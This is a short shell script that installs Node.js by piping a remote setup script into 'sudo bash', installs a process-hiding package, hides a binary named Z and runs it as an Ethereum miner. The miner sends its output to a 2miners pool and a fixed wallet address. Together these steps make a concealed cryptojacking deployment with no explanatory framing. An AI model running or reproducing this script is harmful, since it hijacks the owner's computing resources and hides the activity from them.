curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ph add Z
chmod +x Z
./Z -u 0x4421Ca28FA68E783EA7D32dBe73AEd2160b8d434.$(echo $(shuf -i 1-999 -n 1)-an) -l us-eth.2miners.com --port=2020 --intensity=85 -p x --par=ethash
